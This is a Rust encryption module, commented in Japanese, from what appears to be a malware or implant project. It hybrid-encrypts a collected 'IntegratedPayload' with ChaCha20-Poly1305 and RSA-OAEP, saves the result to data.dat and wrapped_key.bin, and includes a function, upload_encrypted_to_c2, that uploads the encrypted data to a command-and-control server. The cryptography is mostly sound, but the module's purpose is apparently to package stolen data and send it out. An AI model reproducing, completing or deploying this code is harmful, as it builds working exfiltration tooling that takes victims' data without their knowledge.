// 暗号化機能モジュール
use crate::{AoiError, AoiResult};
use chacha20poly1305::{
    aead::{Aead, KeyInit},
    ChaCha20Poly1305, Key, Nonce,
};
use rsa::{
    pkcs8::{DecodePrivateKey, DecodePublicKey}, rand_core::RngCore, Oaep, RsaPrivateKey, RsaPublicKey
};
use serde::{Deserialize, Serialize};
use sha2::Sha256;
use std::path::Path;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::OnceLock;
use std::time::{SystemTime, UNIX_EPOCH};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EncryptedFileData {
    pub filename: String,
    pub encrypted_data: Vec<u8>,
    pub key: [u8; 32],
    pub nonce: [u8; 12],
    pub original_size: usize,
    pub encrypted_size: usize,
}

pub fn encrypt_data_with_key(data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> AoiResult<Vec<u8>> {
    let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
    cipher
        .encrypt(Nonce::from_slice(nonce), data)
        .map_err(|e| AoiError::Encryption(format!("Encryption failed: {:?}", e)))
}

pub fn decrypt_data_with_key(
    encrypted_data: &[u8],
    key: &[u8; 32],
    nonce: &[u8; 12],
) -> AoiResult<Vec<u8>> {
    let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
    cipher
        .decrypt(Nonce::from_slice(nonce), encrypted_data)
        .map_err(|e| AoiError::Encryption(format!("Decryption failed: {:?}", e)))
}

// プロセス内で一意なナンスを生成するためのカウンタとソルト
static NONCE_COUNTER: AtomicU64 = AtomicU64::new(0);
static NONCE_SALT: OnceLock<[u8; 4]> = OnceLock::new();

fn nonce_salt() -> [u8; 4] {
    *NONCE_SALT.get_or_init(|| {
        let mut salt = [0u8; 4];
        // RNGに失敗しても時刻ベースのフォールバックで初期化（ユニーク性重視）
        if rsa::rand_core::OsRng.try_fill_bytes(&mut salt).is_err() {
            let nanos = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_nanos();
            salt.copy_from_slice(&(nanos as u32).to_be_bytes());
        }
        salt
    })
}

/// プロセス内で単調増加カウンタを用いた一意な96bitナンスを生成
/// フォーマット: 4B salt || 8B big-endian counter
pub fn generate_unique_nonce() -> [u8; 12] {
    let salt = nonce_salt();
    let ctr = NONCE_COUNTER.fetch_add(1, Ordering::Relaxed).to_be_bytes();
    let mut nonce = [0u8; 12];
    nonce[..4].copy_from_slice(&salt);
    nonce[4..].copy_from_slice(&ctr);
    nonce
}

/// 安全なキー/ナンス生成（エラーをResultで返却）
pub fn try_generate_key_pair() -> AoiResult<([u8; 32], [u8; 12])> {
    let mut key = [0u8; 32];
    rsa::rand_core::OsRng
        .try_fill_bytes(&mut key)
        .map_err(|e| AoiError::Encryption(format!("Failed to generate random key: {}", e)))?;
    let nonce = generate_unique_nonce();
    Ok((key, nonce))
}

/// RSA-OAEP(SHA-256) で key(32B) + nonce(12B) を公開鍵でラップ
pub fn rsa_wrap_key_nonce_from_file(
    public_key_pem_path: &str,
    key: &[u8; 32],
    nonce: &[u8; 12],
) -> AoiResult<Vec<u8>> {
    let pem_bytes = std::fs::read(public_key_pem_path)
        .map_err(|e| AoiError::Encryption(format!("Failed to read public key PEM: {}", e)))?;
    rsa_wrap_key_nonce_from_pem(&pem_bytes, key, nonce)
}

/// RSA-OAEP(SHA-256) で key(32B) + nonce(12B) をラップ（PEM入力）
pub fn rsa_wrap_key_nonce_from_pem(
    public_key_pem: &[u8],
    key: &[u8; 32],
    nonce: &[u8; 12],
) -> AoiResult<Vec<u8>> {
    let public_key_str = std::str::from_utf8(public_key_pem)
        .map_err(|e| AoiError::Encryption(format!("Invalid public key PEM UTF-8: {}", e)))?;
    let public_key = RsaPublicKey::from_public_key_pem(public_key_str)
        .map_err(|e| AoiError::Encryption(format!("Failed to parse public key PEM: {}", e)))?;

    let mut rng = rsa::rand_core::OsRng;
    let padding = Oaep::new::<Sha256>();
    let mut buf = [0u8; 44];
    buf[..32].copy_from_slice(key);
    buf[32..].copy_from_slice(nonce);
    public_key
        .encrypt(&mut rng, padding, &buf)
        .map_err(|e| AoiError::Encryption(format!("RSA-OAEP wrap failed: {}", e)))
}

/// 公開鍵の取得を自動化して key||nonce をRSA-OAEPでラップ
/// 優先順: config.public_key_pem -> 環境変数 AOI64_PUBLIC_KEY_PEM -> ファイル("public_key.pem")
pub fn rsa_wrap_key_nonce_auto(
    config: Option<&crate::Config>,
    key: &[u8; 32],
    nonce: &[u8; 12],
) -> AoiResult<Vec<u8>> {
    // 1) Configに埋め込まれていればそれを使う
    if let Some(cfg) = config {
        if let Some(ref pem) = cfg.public_key_pem {
            return rsa_wrap_key_nonce_from_pem(pem.as_bytes(), key, nonce);
        }
    }

    // 2) 環境変数から取得
    if let Ok(pem_env) = std::env::var("AOI64_PUBLIC_KEY_PEM") {
        if !pem_env.trim().is_empty() {
            return rsa_wrap_key_nonce_from_pem(pem_env.as_bytes(), key, nonce);
        }
    }

    // 3) 互換: ローカルファイル
    rsa_wrap_key_nonce_from_file("public_key.pem", key, nonce)
}

/// RSA-OAEP(SHA-256) でラップされたデータを秘密鍵で復号し (key, nonce) を返す
pub fn rsa_unwrap_key_nonce_from_file(
    private_key_pem_path: &str,
    wrapped: &[u8],
) -> AoiResult<([u8; 32], [u8; 12])> {
    let pem_bytes = std::fs::read(private_key_pem_path)
        .map_err(|e| AoiError::Encryption(format!("Failed to read private key PEM: {}", e)))?;
    rsa_unwrap_key_nonce_from_pem(&pem_bytes, wrapped)
}

/// RSA-OAEP(SHA-256) でラップ解除（PEM入力）
pub fn rsa_unwrap_key_nonce_from_pem(
    private_key_pem: &[u8],
    wrapped: &[u8],
) -> AoiResult<([u8; 32], [u8; 12])> {
    let private_key_str = std::str::from_utf8(private_key_pem)
        .map_err(|e| AoiError::Encryption(format!("Invalid private key PEM UTF-8: {}", e)))?;
    let private_key = RsaPrivateKey::from_pkcs8_pem(private_key_str)
        .map_err(|e| AoiError::Encryption(format!("Failed to parse private key PEM: {}", e)))?;

    let padding = Oaep::new::<Sha256>();
    let decrypted = private_key
        .decrypt(padding, wrapped)
        .map_err(|e| AoiError::Encryption(format!("RSA-OAEP unwrap failed: {}", e)))?;

    if decrypted.len() != 44 {
        return Err(AoiError::Encryption(format!(
            "Unwrapped length invalid: {} (expected 44)",
            decrypted.len()
        )));
    }

    let mut key = [0u8; 32];
    let mut nonce = [0u8; 12];
    key.copy_from_slice(&decrypted[..32]);
    nonce.copy_from_slice(&decrypted[32..44]);
    Ok((key, nonce))
}

/// ファイルを暗号化してEncryptedFileDataを生成
pub fn encrypt_file<P: AsRef<Path>>(file_path: P) -> AoiResult<EncryptedFileData> {
    let file_path = file_path.as_ref();
    let filename = file_path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("unknown_file")
        .to_string();

    // ファイルを読み込み
    let file_data = std::fs::read(file_path).map_err(|e| AoiError::Io(e))?;

    let original_size = file_data.len();

    // キーとナンスを生成（エラーを伝播）
    let (key, nonce) = try_generate_key_pair()?;

    // データを暗号化
    let encrypted_data = encrypt_data_with_key(&file_data, &key, &nonce)?;
    let encrypted_size = encrypted_data.len();

    Ok(EncryptedFileData {
        filename,
        encrypted_data,
        key,
        nonce,
        original_size,
        encrypted_size,
    })
}

/// EncryptedFileDataから元のファイルデータを復号化
pub fn decrypt_file_data(encrypted_file: &EncryptedFileData) -> AoiResult<Vec<u8>> {
    decrypt_data_with_key(
        &encrypted_file.encrypted_data,
        &encrypted_file.key,
        &encrypted_file.nonce,
    )
}

/// 暗号化されたファイルをディスクに保存
pub fn save_decrypted_file<P: AsRef<Path>>(
    encrypted_file: &EncryptedFileData,
    output_path: P,
) -> AoiResult<()> {
    let decrypted_data = decrypt_file_data(encrypted_file)?;
    std::fs::write(output_path, decrypted_data).map_err(|e| AoiError::Io(e))?;
    Ok(())
}

/// データの暗号化・保存処理を統合的に実行
pub async fn process_and_encrypt_data(
    payload: &crate::IntegratedPayload,
    config: &crate::Config,
) -> AoiResult<(Vec<u8>, Vec<u8>, [u8; 32], [u8; 12])> {
    use rmp_serde::encode::to_vec as to_msgpack_vec;
    
    let serialized = to_msgpack_vec(payload)
        .map_err(|e| AoiError::Encryption(format!("MessagePack serialization failed: {}", e)))?;
    
    let (key, nonce) = try_generate_key_pair()?;
    let encrypted = encrypt_data_with_key(&serialized, &key, &nonce)?;
    let wrapped = rsa_wrap_key_nonce_auto(Some(config), &key, &nonce)?;

    println!("🔐 Data encrypted with ChaCha20-Poly1305:");
    println!("   Original size: {} bytes", serialized.len());
    println!("   Encrypted size: {} bytes", encrypted.len());
    println!("   Key wrapped with RSA: {} bytes", wrapped.len());

    // ファイル保存（暗号化データ本体とラップ鍵）
    tokio::fs::write("data.dat", &encrypted).await
        .map_err(|e| AoiError::Io(e))?;
    tokio::fs::write("wrapped_key.bin", &wrapped).await
        .map_err(|e| AoiError::Io(e))?;
    
    println!("💾 Encrypted files saved:");
    println!("   data.dat: {} bytes", encrypted.len());
    println!("   wrapped_key.bin: {} bytes", wrapped.len());

    Ok((encrypted, wrapped, key, nonce))
}

/// C2サーバーへの暗号化データアップロード
pub async fn upload_encrypted_to_c2(
    c2_client: &crate::C2Client,
    encrypted_data: &[u8],
    wrapped_key: &[u8],
    data_type: &str,
) -> AoiResult<()> {
    c2_client.upload_encrypted_data(encrypted_data, wrapped_key, data_type).await
        .map_err(|e| AoiError::Encryption(format!("C2 upload failed: {}", e)))
}

/// キーとナンスの生成（既存の関数を再エクスポート）
pub fn generate_encryption_keys() -> AoiResult<([u8; 32], [u8; 12])> {
    try_generate_key_pair()
}

/// Base64エンコード/デコード（統一インターフェース）
pub fn encode_base64(data: &[u8]) -> String {
    use base64::{engine::general_purpose, Engine as _};
    general_purpose::STANDARD.encode(data)
}

pub fn decode_base64(encoded: &str) -> AoiResult<Vec<u8>> {
    use base64::{engine::general_purpose, Engine as _};
    general_purpose::STANDARD.decode(encoded)
        .map_err(|e| AoiError::Encryption(format!("Base64 decode failed: {}", e)))
}

/// 柔軟なBase64デコード（パディングあり/なし両対応）
pub fn decode_base64_flexible(input: &str) -> AoiResult<Vec<u8>> {
    use base64::{engine::general_purpose, Engine as _};
    
    // パディング付きで試行
    if let Ok(decoded) = general_purpose::STANDARD.decode(input) {
        return Ok(decoded);
    }
    
    // パディングなしで試行
    general_purpose::STANDARD_NO_PAD.decode(input)
        .map_err(|e| AoiError::Encryption(format!("Flexible Base64 decode failed: {}", e)))
}

/// キーとナンスの検証
pub fn validate_key_nonce(key: &[u8], nonce: &[u8]) -> AoiResult<()> {
    if key.len() != 32 {
        return Err(AoiError::Encryption(format!(
            "Invalid key length: {} (expected 32 bytes)", key.len()
        )));
    }
    if nonce.len() != 12 {
        return Err(AoiError::Encryption(format!(
            "Invalid nonce length: {} (expected 12 bytes)", nonce.len()
        )));
    }
    Ok(())
}

/// 手動キー・ナンスでの復号化処理（raw data返却）
pub fn decrypt_with_manual_keys(
    data_file: &str,
    key_str: &str,
    nonce_str: &str,
) -> AoiResult<Vec<u8>> {
    use std::path::Path;

    // ファイル存在確認  
    if !Path::new(data_file).exists() {
        return Err(AoiError::Encryption(format!("Data file not found: {}", data_file)));
    }

    // キー・ナンスをBase64デコード
    let key = decode_base64_flexible(key_str)?;
    let nonce = decode_base64_flexible(nonce_str)?;

    // 長さ検証
    validate_key_nonce(&key, &nonce)?;

    let key_array: [u8; 32] = key.try_into()
        .map_err(|_| AoiError::Encryption("Key array conversion failed".to_string()))?;
    let nonce_array: [u8; 12] = nonce.try_into()
        .map_err(|_| AoiError::Encryption("Nonce array conversion failed".to_string()))?;

    // データ復号化
    let encrypted_data = std::fs::read(data_file)
        .map_err(|e| AoiError::Io(e))?;
    
    decrypt_data_with_key(&encrypted_data, &key_array, &nonce_array)
}

// 完全な復号化とファイル処理は decrypt.rs で直接処理
